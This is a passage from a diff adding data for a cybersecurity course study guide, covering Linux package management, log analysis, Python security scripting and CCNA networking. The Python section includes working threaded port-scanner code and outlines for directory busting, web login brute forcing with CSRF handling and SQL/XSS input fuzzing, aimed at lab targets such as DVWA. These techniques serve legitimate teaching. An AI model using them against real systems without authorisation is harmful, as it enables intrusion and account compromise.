+{title:"apt — high-level manager",body:"<ul><li><code>apt update</code> — refresh package lists (does NOT upgrade packages)</li><li><code>apt upgrade</code> — upgrade all installed packages</li><li><code>apt install package</code> — install; <code>apt remove</code> — remove (keeps config)</li><li><code>apt purge package</code> — remove with config files</li><li><code>apt search keyword</code>; <code>apt show package</code></li></ul>"},
+{title:"dpkg — low-level manager",body:"<ul><li><code>dpkg -i package.deb</code> — install a .deb file</li><li><code>dpkg -l</code> — list all installed; <code>dpkg -L package</code> — list package files</li><li><code>dpkg -S /usr/bin/nmap</code> — which package owns this file?</li><li>apt calls dpkg underneath — apt resolves dependencies first</li></ul>"},
+{title:"Repositories and sources.list",body:"<ul><li><code>/etc/apt/sources.list</code> and <code>/etc/apt/sources.list.d/</code> — repo config</li><li>Format: <code>deb http://repo.url/ codename main</code></li><li>Adding third-party: add GPG key → add sources entry → apt update</li><li>Risk: untrusted repos can supply malicious packages</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#444441",hours:"2 hrs",task:"apt fundamentals",detail:"Practice full apt workflow: update, search, install, show, remove, purge, autoremove."},
+{week:"Week 2",color:"#888780",hours:"2 hrs",task:"dpkg and .deb files",detail:"Install a .deb manually. Use dpkg -l and dpkg -L to inspect packages."},
+{week:"Week 3",color:"#B4B2A9",hours:"1 hr",task:"Repositories",detail:"Understand GPG key verification and risks of adding untrusted repositories."}],
+practice:["Install nmap with apt and verify version","Find which package provides /usr/bin/python3 using dpkg","Add the official Docker repository to a Debian VM — document each step","Explain the difference between apt remove and apt purge — when does it matter?"],
+resources:[{name:"Debian apt documentation",desc:"Official apt subcommand reference"},{name:"man dpkg",desc:"Complete dpkg manual"},{name:"Kali pkg tracker — pkg.kali.org",desc:"Track Kali-specific packages"}]},
+
+{name:"Log analysis",sub:"grep, awk, sed, tail, /var/log, pipeline chaining",
+overview:"Log analysis is critical for system administration and security incident response. The grep/awk/sed pipeline is one of the most powerful Linux security analysis tools.",
+concepts:[
+{title:"Key log files",body:"<ul><li><code>/var/log/syslog</code> — general system events</li><li><code>/var/log/auth.log</code> — authentication: SSH logins, sudo, su</li><li><code>/var/log/apache2/access.log</code> — web server requests</li><li><code>tail -f /var/log/auth.log</code> — follow in real time</li><li><code>journalctl -u sshd --since &quot;1 hour ago&quot;</code></li></ul>"},
+{title:"grep",body:"<ul><li><code>grep &quot;pattern&quot; file</code> — matching lines</li><li><code>-i</code> case-insensitive; <code>-v</code> exclude; <code>-r</code> recursive; <code>-n</code> line numbers; <code>-c</code> count</li><li><code>grep -E &quot;^[0-9]{4}&quot;</code> — extended regex</li></ul>"},
+{title:"awk — field processing",body:"<ul><li><code>awk '{print $1}' file</code> — first field</li><li><code>awk -F: '{print $1}' /etc/passwd</code> — colon delimiter</li><li><code>awk '/Failed/ {print $11}' auth.log</code> — filter then print</li><li><code>awk '{sum+=$10} END {print sum}' access.log</code> — sum column</li></ul>"},
+{title:"sed — stream editor",body:"<ul><li><code>sed 's/old/new/g' file</code> — replace all; <code>-i</code> edit in place</li><li><code>sed '/^#/d' file</code> — delete comment lines</li><li>Pipeline: <code>grep &quot;Failed&quot; auth.log | sed 's/.*from //' | awk '{print $1}'</code> — extract IPs</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#444441",hours:"3 hrs",task:"grep mastery",detail:"Use grep with 10+ different flags on real log files. Extract events from auth.log."},
+{week:"Week 2",color:"#888780",hours:"4 hrs",task:"awk and sed",detail:"Extract and summarise fields from Apache access logs with awk. Transform data with sed."},
+{week:"Week 3",color:"#B4B2A9",hours:"3 hrs",task:"Pipeline exercises",detail:"Build grep|awk|sed|sort|uniq -c|sort -rn pipelines to produce actionable reports."}],
+practice:["Extract all IPs from failed SSH logins in auth.log and count occurrences per IP","Use awk to total bytes transferred from an Apache access log","Write a sed command to redact all email addresses in a log file","Build a pipeline showing the top 10 most requested URLs from an Apache access log"],
+resources:[{name:"GNU awk guide — gawk.info",desc:"Complete awk reference"},{name:"sed one-liners — Eric Pement",desc:"Classic sed one-liner collection"},{name:"SANS — Log analysis CLI guide",desc:"Security-focused log analysis"}]}
+]},
+
+{id:"prog",name:"Programming for Cyber Security",shortName:"Python",icon:"ti-code",bg:"#EEEDFE",iconColor:"#534AB7",meta:"Optional module · SCQF Level 8",
+desc:"Python is the dominant language for security scripting. This module develops programming skills applied to security: port scanners, brute forcers, log parsers and network automation tools.",
+assess:[{l:"Coursework",r:"Coding portfolio / project — 60%"},{l:"Written",r:"Code comprehension test — 40%"}],
+topics:[
+{name:"Python fundamentals",sub:"Data types, control flow, OOP, exception handling",
+overview:"A solid Python foundation underpins all security scripting. Focus on data structures, OOP and exception handling — security tools are built from these primitives.",
+concepts:[
+{title:"Data types and structures",body:"<ul><li><strong>List</strong> — ordered, mutable: <code>[1,2,3]</code></li><li><strong>Tuple</strong> — ordered, immutable: <code>(1,2,3)</code></li><li><strong>Dict</strong> — key-value: <code>{&quot;key&quot;:&quot;val&quot;}</code></li><li><strong>Set</strong> — unordered, unique: <code>{1,2,3}</code></li><li>String methods: <code>.split()</code>, <code>.strip()</code>, <code>.replace()</code>, <code>.encode()</code></li><li>List comprehension: <code>[x*2 for x in range(10) if x%2==0]</code></li></ul>"},
+{title:"Control flow and functions",body:"<ul><li><code>def my_func(param, default=&quot;val&quot;):</code></li><li><code>*args</code> — variable positional (tuple); <code>**kwargs</code> — keyword (dict)</li><li>Lambda: <code>f = lambda x: x*2</code></li><li>Generator: <code>yield</code> — lazy evaluation; memory-efficient for large wordlists</li></ul>"},
+{title:"Object-oriented programming",body:"<ul><li><code>class Scanner:</code><br><code>&nbsp;&nbsp;def __init__(self, host):</code><br><code>&nbsp;&nbsp;&nbsp;&nbsp;self.host = host</code></li><li>Inheritance: <code>class TCPScanner(Scanner):</code></li><li><code>super().__init__()</code> — call parent constructor</li><li><code>@staticmethod</code> — no self needed; <code>@classmethod</code> — receives class</li></ul>"},
+{title:"Exception handling",body:"<ul><li><code>try: ... except ValueError as e: ... else: ... finally: ...</code></li><li>Common: ValueError, TypeError, KeyError, FileNotFoundError, ConnectionRefusedError, socket.timeout</li><li>Raise: <code>raise ValueError(&quot;Invalid IP&quot;)</code></li><li>Always handle exceptions in network code — connections fail unpredictably</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#534AB7",hours:"4 hrs",task:"Data structures and control flow",detail:"Write programs using all data structure types. Practice list comprehensions and functions with default args."},
+{week:"Week 2",color:"#7F77DD",hours:"4 hrs",task:"OOP — build a class",detail:"Design a Host class with IP, open ports, methods to add ports and print a report. Add inheritance."},
+{week:"Week 3",color:"#AFA9EC",hours:"3 hrs",task:"Exception handling",detail:"Add proper exception handling to all network code. Test with refused connections and timeouts."}],
+practice:["Write class 'PortScanner' with host IP, open ports list, methods to add ports and print report","Count IP occurrences in a log line list using a dictionary","Write a generator yielding all 4-char lowercase password combinations","Handle ConnectionRefusedError and socket.timeout gracefully in a connect function"],
+resources:[{name:"Automate the Boring Stuff — Al Sweigart (free)",desc:"Excellent practical Python book"},{name:"Real Python — realpython.com",desc:"High-quality tutorials for all Python topics"},{name:"Python docs — docs.python.org",desc:"Official reference documentation"}]},
+
+{name:"Network programming",sub:"Sockets, TCP/UDP, requests library, threaded port scanner",
+overview:"Network programming underpins most security tools. The socket library is used for port scanners and protocol tools; the requests library handles HTTP automation.",
+concepts:[
+{title:"TCP socket basics",body:"<ul><li><code>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</code></li><li><code>s.settimeout(1)</code> — essential for scanners</li><li><code>s.connect((&quot;192.168.1.1&quot;, 80))</code></li><li><code>s.send(b&quot;GET / HTTP/1.0\\r\\n\\r\\n&quot;)</code></li><li><code>data = s.recv(1024)</code></li><li>Context manager: <code>with socket.socket() as s:</code></li></ul>"},
+{title:"Threaded port scanner pattern",body:"<pre>from queue import Queue\nimport socket, threading\nopen_ports = []\nqueue = Queue()\ndef worker(host):\n    while not queue.empty():\n        port = queue.get()\n        try:\n            s = socket.socket()\n            s.settimeout(0.5)\n            s.connect((host, port))\n            open_ports.append(port)\n        except: pass\n        finally: s.close(); queue.task_done()\nfor p in range(1,1025): queue.put(p)\nts = [threading.Thread(target=worker,args=(&quot;target&quot;,)) for _ in range(100)]\n[t.start() for t in ts]; queue.join()</pre>"},
+{title:"requests library — HTTP",body:"<ul><li><code>r = requests.get(&quot;https://example.com&quot;)</code></li><li><code>r.status_code</code>, <code>r.text</code>, <code>r.json()</code>, <code>r.headers</code></li><li>POST: <code>requests.post(url, data={&quot;user&quot;:&quot;admin&quot;})</code></li><li>Session: <code>s = requests.Session()</code> — persists cookies across requests</li><li>Proxy: <code>proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}, verify=False</code></li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#534AB7",hours:"4 hrs",task:"TCP socket programming",detail:"Write a TCP client. Build a basic single-threaded port scanner with proper exception handling."},
+{week:"Week 2",color:"#7F77DD",hours:"4 hrs",task:"Threaded scanner",detail:"Add threading with Queue. Add banner grabbing. Add argparse for CLI options."},
+{week:"Week 3",color:"#AFA9EC",hours:"3 hrs",task:"HTTP automation",detail:"Automate a web login with requests. Handle cookies, redirects. Route through Burp Suite."}],
+practice:["Write a multi-threaded port scanner scanning 1-1024 in under 5 seconds","Build a banner grabber reading first 1024 bytes from open ports","Write a script brute-forcing a web login with requests and a password list","Create a TCP listener accepting one connection and printing what it receives"],
+resources:[{name:"Python socket docs",desc:"docs.python.org/3/library/socket.html"},{name:"Black Hat Python — Justin Seitz",desc:"Python for hackers and pentesters"},{name:"requests docs — docs.python-requests.org",desc:"Complete HTTP library reference"}]},
+
+{name:"File & data handling",sub:"File I/O, JSON, CSV, os module, log parsing",
+overview:"Security scripts constantly read and write files — wordlists, logs, configs, scan output. Mastering file I/O and parsing is essential for building useful tools.",
+concepts:[
+{title:"File reading and writing",body:"<ul><li><code>with open(&quot;file.txt&quot;, &quot;r&quot;) as f: data = f.read()</code></li><li>Read lines: <code>for line in f:</code> — memory efficient for large files</li><li>Write modes: <code>&quot;w&quot;</code> (overwrite), <code>&quot;a&quot;</code> (append), <code>&quot;rb&quot;</code> (binary)</li><li>Always <code>strip()</code> lines to remove trailing newlines</li><li><code>with</code> always auto-closes file on exception</li></ul>"},
+{title:"JSON handling",body:"<ul><li><code>json.loads(string)</code> — parse JSON string to Python object</li><li><code>json.load(file)</code> — parse from file object</li><li><code>json.dumps(data, indent=2)</code> — pretty-print Python to JSON string</li><li><code>json.dump(data, file)</code> — write JSON to file</li></ul>"},
+{title:"CSV handling",body:"<ul><li><code>reader = csv.reader(f)</code> — rows as lists</li><li><code>reader = csv.DictReader(f)</code> — rows as dicts using header row</li><li><code>writer = csv.writer(f); writer.writerow([&quot;col1&quot;,&quot;col2&quot;])</code></li><li>Common uses: credential dumps, user lists, Nessus exports</li></ul>"},
+{title:"os and pathlib",body:"<ul><li><code>os.path.exists(path)</code>, <code>os.path.join(&quot;dir&quot;, &quot;file&quot;)</code></li><li><code>os.walk(&quot;.&quot;)</code> — recursive directory tree walk</li><li><code>os.makedirs(&quot;dir&quot;, exist_ok=True)</code></li><li>pathlib: <code>Path(&quot;file.txt&quot;).read_text()</code> — modern alternative</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#534AB7",hours:"3 hrs",task:"File I/O and wordlists",detail:"Read wordlists line by line, filter entries, write results. Handle encoding errors."},
+{week:"Week 2",color:"#7F77DD",hours:"3 hrs",task:"JSON and CSV",detail:"Parse a Nmap output or credential CSV. Extract and present fields clearly."},
+{week:"Week 3",color:"#AFA9EC",hours:"2 hrs",task:"Directory search",detail:"Use os.walk to search all Python files in a directory tree for hardcoded credentials."}],
+practice:["Read rockyou.txt and yield passwords of a given length using a generator","Parse Apache access log and extract IP, timestamp, URL, status per line","Load a JSON config file, validate required fields, write processed results to new JSON","Search all .py files in a directory tree for lines containing 'password' or 'secret'"],
+resources:[{name:"Python file I/O docs",desc:"docs.python.org/3/tutorial/inputoutput.html"},{name:"Python json module docs",desc:"Complete json reference"},{name:"Real Python — working with files",desc:"Practical file handling guide"}]},
+
+{name:"Scripting attacks",sub:"Port scanners, brute forcers, directory busters, fuzzing",
+overview:"Building security tools from scratch deepens your understanding of attacks and defences. These form the core of your programming portfolio — code quality and comments matter as much as functionality.",
+concepts:[
+{title:"Directory brute forcer",body:"<ul><li>Read wordlist, send GET for each: <code>requests.get(f&quot;{url}/{word}&quot;)</code></li><li>200 = found; 403 = forbidden but exists; 404 = not found</li><li>Add common extensions: <code>.php</code>, <code>.bak</code>, <code>.old</code></li><li>Use threading for speed</li></ul>"},
+{title:"HTTP login brute forcer",body:"<ul><li>Identify form fields with browser DevTools or Burp</li><li>POST each password; detect success by status code or response text</li><li>Handle CSRF tokens: fetch login page first, extract token, include in POST</li><li>Rate limit: <code>time.sleep(0.5)</code> to avoid account lockout</li><li>Use <code>requests.Session()</code> to persist cookies</li></ul>"},
+{title:"Simple input fuzzer",body:"<ul><li>Fuzz strings: very long strings, SQL chars (' &quot; -- ;), XSS strings, null bytes (%00)</li><li>Send each to URL parameter, form field, or header</li><li>Monitor responses: 500 error on SQL chars suggests injection; different length = reflection</li></ul>"},
+{title:"Code quality for portfolios",body:"<ul><li>Comment your code — explain <em>why</em>, not just what</li><li>Meaningful names: <code>target_host</code> not <code>t</code></li><li>Proper exception handling — never bare <code>except:</code></li><li>argparse for CLI options, not hardcoded values</li><li>Write a README explaining what the tool does and how to run it</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#534AB7",hours:"4 hrs",task:"Port scanner and dir buster",detail:"Build both from scratch. Test against Metasploitable2 / DVWA. Document findings."},
+{week:"Week 2",color:"#7F77DD",hours:"4 hrs",task:"Login brute forcer",detail:"Build a login brute forcer for DVWA (security=low). Handle cookies and redirects."},
+{week:"Week 3",color:"#AFA9EC",hours:"3 hrs",task:"Polish and portfolio",detail:"Clean code, add comments, write READMEs. Quality matters as much as functionality."}],
+practice:["Add banner grabbing to your port scanner — identify the service","Write a dir buster checking backup extensions (.bak .old .zip) as well as wordlist paths","Build a login brute forcer for DVWA that handles CSRF tokens","Create an HTTP fuzzer testing a URL parameter for SQL injection indicators"],
+resources:[{name:"DVWA — Damn Vulnerable Web App",desc:"Safe target for attack scripts"},{name:"Black Hat Python — Seitz",desc:"Full worked security tool examples"},{name:"concurrent.futures docs",desc:"Python's built-in thread pool for fast scanning"}]},
+
+{name:"Regular expressions",sub:"re module, character classes, groups, common security patterns",
+overview:"Regular expressions appear in almost every security script — log analysis, input validation, data extraction. The re module is tested in the written code comprehension assessment.",
+concepts:[
+{title:"re module functions",body:"<ul><li><code>re.search(pattern, string)</code> — first match anywhere in string</li><li><code>re.match(pattern, string)</code> — match at start of string only</li><li><code>re.findall(pattern, string)</code> — all matches as a list</li><li><code>re.sub(pattern, replacement, string)</code> — find and replace</li><li><code>re.compile(pattern)</code> — compile for reuse (faster in loops)</li></ul>"},
+{title:"Patterns and quantifiers",body:"<ul><li><code>.</code> — any char; <code>\\d</code> — digit; <code>\\w</code> — word char; <code>\\s</code> — whitespace</li><li><code>^</code> — start; <code>$</code> — end; <code>\\b</code> — word boundary</li><li><code>[abc]</code> — any of; <code>[^abc]</code> — not; <code>[a-z]</code> — range</li><li><code>*</code> 0+; <code>+</code> 1+; <code>?</code> 0 or 1; <code>{3}</code> exactly 3; <code>{2,5}</code> range</li><li>Greedy: <code>.*</code> vs lazy: <code>.*?</code></li></ul>"},
+{title:"Groups and capturing",body:"<ul><li><code>(pattern)</code> — capturing group; <code>match.group(1)</code></li><li><code>(?P&lt;name&gt;pattern)</code> — named group; <code>match.group(&quot;name&quot;)</code></li><li><code>(?:pattern)</code> — non-capturing group</li></ul>"},
+{title:"Common security patterns",body:"<ul><li>IPv4: <code>r'\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b'</code></li><li>Email: <code>r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}'</code></li><li>URL: <code>r'https?://[^\\s]+'</code></li><li>MD5 hash: <code>r'\\b[a-fA-F0-9]{32}\\b'</code></li><li>Strong password: <code>r'^(?=.*[A-Z])(?=.*\\d)(?=.*[!@#$]).{8,}$'</code></li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#534AB7",hours:"3 hrs",task:"Regex fundamentals",detail:"Practice on regex101.com with real log lines. Master character classes, quantifiers and anchors."},
+{week:"Week 2",color:"#7F77DD",hours:"3 hrs",task:"Groups and extraction",detail:"Use capturing groups to extract IPs, timestamps, usernames from log files."},
+{week:"Week 3",color:"#AFA9EC",hours:"2 hrs",task:"Log analysis script",detail:"Build a script reading auth.log, extracting failed login IPs, counting them, reporting top offenders."}],
+practice:["Write regex extracting all IPv4 addresses from a log file","Use re.findall to extract all URLs from a fetched HTML page","Write regex validating: min 8 chars, 1 uppercase, 1 digit, 1 special char","Parse an Apache log line using named groups — extract IP, timestamp, method, URL, status, bytes"],
+resources:[{name:"regex101.com",desc:"Interactive regex tester with explanation — essential"},{name:"Python re module docs",desc:"Complete function reference"},{name:"Regular Expressions Cookbook — Goyvaerts",desc:"Python examples for common patterns"}]},
+
+{name:"Automation",sub:"argparse, subprocess, logging module, paramiko SSH",
+overview:"Automation is where Python security scripting becomes truly powerful. Professional tools use argparse, proper logging and can orchestrate system tools via subprocess or SSH with paramiko.",
+concepts:[
+{title:"argparse — CLI interfaces",body:"<ul><li><code>parser = argparse.ArgumentParser(description=&quot;Tool&quot;)</code></li><li><code>parser.add_argument(&quot;target&quot;, help=&quot;Target host&quot;)</code></li><li><code>parser.add_argument(&quot;-p&quot;, &quot;--port&quot;, type=int, default=80)</code></li><li><code>parser.add_argument(&quot;-v&quot;, &quot;--verbose&quot;, action=&quot;store_true&quot;)</code></li><li><code>args = parser.parse_args()</code> → <code>args.target</code>, <code>args.port</code></li><li>Automatic --help generation</li></ul>"},
+{title:"subprocess — run system commands",body:"<ul><li><code>result = subprocess.run([&quot;nmap&quot;,&quot;-sV&quot;,target], capture_output=True, text=True)</code></li><li><code>result.stdout</code> — output; <code>result.returncode</code></li><li>Never use <code>shell=True</code> with user input — command injection risk</li><li>Use case: wrap Nmap, gobuster, hashcat in a Python orchestration script</li></ul>"},
+{title:"logging module",body:"<ul><li><code>logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')</code></li><li>Levels: DEBUG &lt; INFO &lt; WARNING &lt; ERROR &lt; CRITICAL</li><li>Log to file: add <code>filename='tool.log'</code></li><li>Benefits: timestamps, severity levels, easy to toggle verbosity</li></ul>"},
+{title:"paramiko — SSH automation",body:"<ul><li><code>ssh = paramiko.SSHClient()</code></li><li><code>ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</code></li><li><code>ssh.connect(&quot;host&quot;, username=&quot;user&quot;, password=&quot;pass&quot;)</code></li><li><code>stdin, stdout, stderr = ssh.exec_command(&quot;ls -la&quot;)</code></li><li>Key auth: <code>ssh.connect(host, username=u, key_filename=&quot;/path/key&quot;)</code></li><li>SFTP: <code>sftp = ssh.open_sftp(); sftp.get(remote, local)</code></li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#534AB7",hours:"3 hrs",task:"argparse and subprocess",detail:"Refactor an existing script with argparse. Use subprocess to wrap Nmap and parse its output."},
+{week:"Week 2",color:"#7F77DD",hours:"3 hrs",task:"Logging",detail:"Replace all print statements with logging. Set different levels for verbose and quiet output."},
+{week:"Week 3",color:"#AFA9EC",hours:"3 hrs",task:"paramiko SSH tool",detail:"Write a script connecting to multiple VMs via SSH, running a command on each, collecting output."}],
+practice:["Refactor your port scanner with argparse: host, port range, timeout, output file flags","Write a subprocess wrapper running Nmap and parsing grepable output","Add rotating file logging to one of your security tools","Write a paramiko script logging into multiple SSH hosts and retrieving /etc/os-release from each"],
+resources:[{name:"argparse docs — Python",desc:"docs.python.org/3/library/argparse.html"},{name:"paramiko docs — paramiko.org",desc:"Complete paramiko reference"},{name:"Python logging HOWTO",desc:"docs.python.org/3/howto/logging.html"}]}
+]},
+
+{id:"ccna",name:"CCNA: Networking",shortName:"CCNA",icon:"ti-network",bg:"#E1F5EE",iconColor:"#0F6E56",meta:"Optional module · SCQF Level 8",
+desc:"Covers networking fundamentals from Cisco's CCNA curriculum. Strong networking knowledge underpins all network security work — you must understand the network to attack or defend it.",
+assess:[{l:"Practical",r:"Packet Tracer labs — 50%"},{l:"Exam",r:"CCNA-style theory exam — 50%"}],
+topics:[
+{name:"OSI & TCP/IP models",sub:"7 layers, PDUs, encapsulation, protocols at each layer",
+overview:"The OSI and TCP/IP models are the conceptual frameworks for all networking. You must know both, their layers, PDU names and key protocols — exam questions test this directly.",
+concepts:[
+{title:"OSI 7-layer model",body:"Mnemonic: <em>Please Do Not Throw Sausage Pizza Away</em><ul><li><strong>7 Application</strong> — HTTP(80), HTTPS(443), DNS(53), SMTP(25), FTP(21), SSH(22), Telnet(23)</li><li><strong>6 Presentation</strong> — TLS/SSL, encoding, compression</li><li><strong>5 Session</strong> — NetBIOS, RPC</li><li><strong>4 Transport</strong> — TCP, UDP. PDU = Segment</li><li><strong>3 Network</strong> — IP, ICMP, OSPF, BGP. PDU = Packet</li><li><strong>2 Data Link</strong> — Ethernet, 802.11. PDU = Frame</li><li><strong>1 Physical</strong> — cables, radio. PDU = Bits</li></ul>"},
+{title:"TCP/IP 4-layer model",body:"<ul><li><strong>Application</strong> — OSI layers 5+6+7</li><li><strong>Transport</strong> — TCP and UDP</li><li><strong>Internet</strong> — IP, ICMP, ARP</li><li><strong>Network Access</strong> — OSI layers 1+2: Ethernet, Wi-Fi</li></ul>Know which OSI layers map to each TCP/IP layer — common exam question."},
+{title:"Encapsulation",body:"As data travels down the stack, headers are added:<ul><li>App data → L4 header added → <strong>Segment</strong></li><li>Segment → L3 IP header → <strong>Packet</strong></li><li>Packet → L2 Ethernet header+trailer → <strong>Frame</strong></li><li>Frame → L1 → <strong>Bits</strong></li><li>De-encapsulation reverses this at the receiver</li></ul>"},
+{title:"Key protocols and ports",body:"<ul><li>HTTP=80, HTTPS=443, DNS=53, SMTP=25, FTP=21, SSH=22, Telnet=23, RDP=3389, DHCP=67/68</li><li>TCP — reliable, connection-oriented (SYN→SYN-ACK→ACK handshake)</li><li>UDP — unreliable, connectionless, fast (DNS, DHCP, VoIP, streaming)</li><li>ARP — resolves IP to MAC address on local network</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#0F6E56",hours:"3 hrs",task:"Memorise both models",detail:"Learn with mnemonic. Know PDU at each layer. Map OSI to TCP/IP layers."},
+{week:"Week 2",color:"#1D9E75",hours:"3 hrs",task:"Protocols and ports",detail:"Create a table: protocol, port number, OSI layer, TCP or UDP. Port numbers are frequently tested."},
+{week:"Week 3",color:"#5DCAA5",hours:"2 hrs",task:"Encapsulation tracing",detail:"Trace a packet from browser to web server — name every header added and removed at each layer."}],
+practice:["List the PDU name at each OSI layer","Explain ARP — how does it resolve an IP to a MAC address, step by step?","At which layer does a router operate? A switch? A hub? Explain why","Trace the complete encapsulation of an HTTP GET request across one router to a web server"],
+resources:[{name:"Cisco NetAcad CCNA 1",desc:"Free course covering both models in full"},{name:"Professor Messer — Network+ guide",desc:"Free clear networking fundamentals"},{name:"Packet Tracer simulation mode",desc:"Trace packets through a network visually"}]},
+
+{name:"IP addressing",sub:"IPv4 subnetting, CIDR notation, VLSM, IPv6 basics",
+overview:"Subnetting is the most heavily tested CCNA topic. You must subnet by hand quickly and accurately. Practice every day until block size calculations are instinctive.",
+concepts:[
+{title:"IPv4 address structure",body:"<ul><li>32-bit, four octets: 192.168.1.100</li><li>Subnet mask divides network and host portions: 255.255.255.0 = /24</li><li>Private ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16</li><li>Loopback: 127.0.0.0/8; APIPA: 169.254.0.0/16</li></ul>"},
+{title:"Subnetting — block size method",body:"For prefix /n:<ul><li>Host bits = 32 − n; Usable hosts = 2^(host bits) − 2</li><li>Block size = 256 − interesting octet of mask</li><li>Subnets start at: 0, block, 2×block, 3×block...</li><li><strong>Example: 192.168.1.130/26</strong><br>Host bits=6, block=64, subnets: .0,.64,.128,.192<br>130 falls in .128 subnet<br>Network:.128, Broadcast:.191, Hosts:.129-.190</li></ul>"},
+{title:"VLSM and summarisation",body:"<strong>VLSM</strong>: assign different prefix lengths to match host counts<ul><li>Sort requirements largest to smallest; assign smallest fitting subnet</li></ul><strong>Summarisation</strong>: combine adjacent subnets into one advertisement<ul><li>Example: 192.168.0.0-3.0/24 → 192.168.0.0/22</li></ul>"},
+{title:"IPv6 basics",body:"<ul><li>128-bit, 8 groups of 4 hex digits: 2001:0db8::8a2e:370:7334</li><li>Abbreviation: drop leading zeros; :: replaces one group of consecutive zeros</li><li>/64 standard subnet prefix</li><li>Global unicast (2000::/3), link-local (FE80::/10), multicast (FF00::/8)</li><li>No broadcast in IPv6 — uses multicast instead</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#0F6E56",hours:"4 hrs",task:"Block size method",detail:"Work 20 subnetting problems using the block size method. Verify with a calculator."},
+{week:"Week 2",color:"#1D9E75",hours:"4 hrs",task:"VLSM and summarisation",detail:"Design VLSM addressing for a given topology. Practice route summarisation."},
+{week:"Week 3",color:"#5DCAA5",hours:"3 hrs",task:"Speed practice and IPv6",detail:"Time yourself — under 90 seconds per problem. Study IPv6 abbreviation rules."}],
+practice:["Subnet 172.16.0.0/12 into /20 subnets — how many subnets? Hosts per subnet? First 4 addresses?","Given 10.15.47.200/19 — network, broadcast, first usable, last usable host","VLSM design: HQ=100 hosts, Branch=50, Remote=25, WAN=2 hosts, starting 192.168.10.0/24","Convert 2001:0DB8:0000:0000:0000:0000:0000:0001 to shortest form"],
+resources:[{name:"subnettingpractice.com",desc:"Drill subnetting with instant feedback"},{name:"Cisco subnetting guide",desc:"Comprehensive free tutorial"},{name:"David Bombal — IPv6 (YouTube)",desc:"Free IPv6 deep dive"}]},
+
+{name:"Routing protocols",sub:"Static routes, OSPF, EIGRP, BGP, administrative distance",
+overview:"Routing protocols enable automatic path discovery. OSPF is the most important for this module — understand how it works conceptually, not just how to configure it.",
+concepts:[
+{title:"Static routing",body:"<ul><li><code>ip route 192.168.2.0 255.255.255.0 10.0.0.2</code></li><li>Default route: <code>ip route 0.0.0.0 0.0.0.0 10.0.0.1</code></li><li>Pros: predictable, no overhead. Cons: no auto-failover, doesn't scale</li></ul>"},
+{title:"Administrative distance (AD)",body:"Lower AD = more trusted. Router prefers lowest AD route:<ul><li>Connected: 0 | Static: 1 | OSPF: 110 | RIP: 120 | External EIGRP: 170</li><li>If router has both static (AD=1) and OSPF (AD=110) route to same prefix, static wins</li></ul>"},
+{title:"OSPF — how it works",body:"Link-state protocol — each router knows complete topology:<ul><li>Routers flood LSAs to build identical LSDB (topology database)</li><li>Dijkstra's SPF algorithm computes shortest paths from LSDB</li><li>DR/BDR election on multi-access segments reduces LSA flooding</li><li>Areas: Area 0 (backbone) required; other areas connect to Area 0</li><li>Config: <code>router ospf 1</code>; <code>network 192.168.1.0 0.0.0.255 area 0</code></li></ul>"},
+{title:"EIGRP and BGP overview",body:"<strong>EIGRP</strong> (Cisco hybrid):<ul><li>Stores successor (best) and feasible successor (backup) paths</li><li>DUAL algorithm — fast convergence, loop-free</li></ul><strong>BGP</strong>:<ul><li>The routing protocol of the internet — between ISPs and large organisations</li><li>Path vector: decisions based on policy, not just metrics</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#0F6E56",hours:"3 hrs",task:"Static routing and AD",detail:"Configure static and default routes in Packet Tracer. Memorise all AD values."},
+{week:"Week 2",color:"#1D9E75",hours:"4 hrs",task:"OSPF configuration",detail:"Configure OSPF on 3-router topology. Verify with show commands. Understand DR/BDR."},
+{week:"Week 3",color:"#5DCAA5",hours:"3 hrs",task:"Troubleshooting",detail:"Deliberately misconfigure and diagnose: show ip route, show ip ospf neighbor, show ip protocols."}],
+practice:["Configure OSPF on 3-router topology in Packet Tracer — verify full reachability","Explain reconvergence when a link fails in OSPF — step by step","Router has static and OSPF route to same prefix — which wins and why?","Explain DR/BDR election on a multi-access Ethernet segment with 4 routers"],
+resources:[{name:"Cisco OSPF configuration guide",desc:"Official reference"},{name:"Jeremy's IT Lab — Free CCNA (YouTube)",desc:"Best free CCNA course available"},{name:"NetAcad Packet Tracer labs",desc:"Practice until configuration is automatic"}]},
+
+{name:"Switching",sub:"VLANs, STP, MAC address table, 802.1Q trunking",
+overview:"Switches forward frames using MAC addresses. VLANs segment broadcast domains; STP prevents loops. Both are critical for network security design and are assessed in labs and theory exams.",
+concepts:[
+{title:"How switches forward frames",body:"<ul><li>Switch learns MACs from source MAC of incoming frames (CAM table)</li><li>Known destination → unicast to that port</li><li>Unknown destination → flood all ports except source</li><li>FF:FF:FF:FF:FF:FF → broadcast to all ports</li><li><code>show mac address-table</code> — view learned MACs</li><li><strong>MAC flooding attack</strong> — fill CAM table, force switch to act as hub</li></ul>"},
+{title:"VLANs",body:"<ul><li>Segment one switch into multiple broadcast domains</li><li>VLAN 10 traffic cannot reach VLAN 20 without routing</li><li>Config: <code>vlan 10; name Sales; interface fa0/1; switchport mode access; switchport access vlan 10</code></li><li>Default VLAN 1 — best practice not to use it</li></ul>"},
+{title:"802.1Q trunking",body:"<ul><li>Trunk links carry multiple VLANs between switches</li><li>802.1Q adds 4-byte tag with 12-bit VLAN ID (up to 4094 VLANs)</li><li>Config: <code>interface gi0/1; switchport mode trunk; switchport trunk encapsulation dot1q</code></li><li>Native VLAN — untagged traffic on trunk (change from VLAN 1)</li><li>Disable DTP: <code>switchport nonegotiate</code></li></ul>"},
